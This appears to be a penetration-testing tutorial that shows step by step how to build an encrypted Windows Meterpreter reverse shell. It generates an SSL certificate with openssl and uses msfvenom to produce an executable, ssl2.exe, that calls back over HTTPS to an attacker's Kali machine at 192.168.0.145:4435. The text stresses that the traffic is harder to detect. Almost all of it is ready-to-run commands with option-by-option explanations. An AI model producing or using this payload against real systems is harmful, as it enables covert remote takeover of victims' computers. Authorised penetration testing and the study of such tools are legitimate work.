
# üîí Encrypted Reverse Shell Payload with HTTPS + SSL Certificate  

## üéØ Goal  
We want to create a **reverse shell payload** that connects back to our Kali machine over **HTTPS** using **SSL encryption**.  
This makes the connection look like normal web traffic (harder to detect) and ensures data is **encrypted** between attacker and victim.  

---

## Step 1: Generate SSL Certificates  


openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout key.pem -out cert.pem


### üîç Breakdown of Options:

* **openssl req** ‚Üí Start an X.509 certificate request/generation.
* **-new** ‚Üí Create a new certificate request.
* **-newkey rsa:4096** ‚Üí Generate a new RSA private key of size 4096 bits.
* **-days 365** ‚Üí Valid for 365 days (1 year).
* **-nodes** ‚Üí Do not encrypt the private key (no password required to use it).
* **-x509** ‚Üí Create a self-signed certificate instead of a signing request.
* **-keyout key.pem** ‚Üí Save the private key to `key.pem`.
* **-out cert.pem** ‚Üí Save the certificate to `cert.pem`.

üëâ This creates:

* `key.pem` = Private key.
* `cert.pem` = SSL certificate.

```bash
cat key.pem cert.pem > combined.pem
```

* **cat** ‚Üí Concatenates files.
* This merges the private key and certificate into **one file (`combined.pem`)**.
* Metasploit needs a single combined certificate for the handler.

---

## Step 2: Create Encrypted Payload with msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.145 LPORT=4435 \
PayloadUUIDTracking=true HandlerSSLCert=/root/combined.pem StagerVerifySSLCert=true \
-f exe -o ssl2.exe
```

### üîç Breakdown of Options:

* **msfvenom** ‚Üí Tool to generate exploit payloads.

* **-p windows/x64/meterpreter/reverse\_https**

  * Payload type = 64-bit Windows Meterpreter.
  * Communication protocol = reverse HTTPS (encrypted).

* **LHOST=192.168.0.145** ‚Üí Attacker‚Äôs IP (listener/your Kali machine).

* **LPORT=4435** ‚Üí Port on Kali to receive the connection.

* **PayloadUUIDTracking=true** ‚Üí Assigns a unique ID to the payload so Metasploit can track and log usage.

* **HandlerSSLCert=/root/combined.pem** ‚Üí Use the SSL certificate we generated for encryption.

* **StagerVerifySSLCert=true** ‚Üí Victim verifies the SSL certificate before connecting (prevents MITM attacks).

* **-f exe** ‚Üí Output format = Windows executable (.exe).

* **-o ssl2.exe** ‚Üí Save the payload as `ssl2.exe`.

üëâ This command produces an **encrypted Windows payload** (`ssl2.exe`) that, when executed on the target, creates a secure Meterpreter reverse shell over HTTPS.

---

## ‚úÖ What This Command Does

1. Builds a Windows executable (`ssl2.exe`).
2. When run on the victim machine:

   * It initiates a **reverse connection** to Kali (`192.168.0.145:4435`).
   * The traffic is encrypted using **SSL (combined.pem certificate)**.
   * The session runs inside a **Meterpreter shell**.
3. This makes the payload:

   * **Harder to detect** (looks like HTTPS web traffic).
   * **Encrypted**, so traffic is not readable.
   * **Safer for testing**, since it checks SSL certificates.


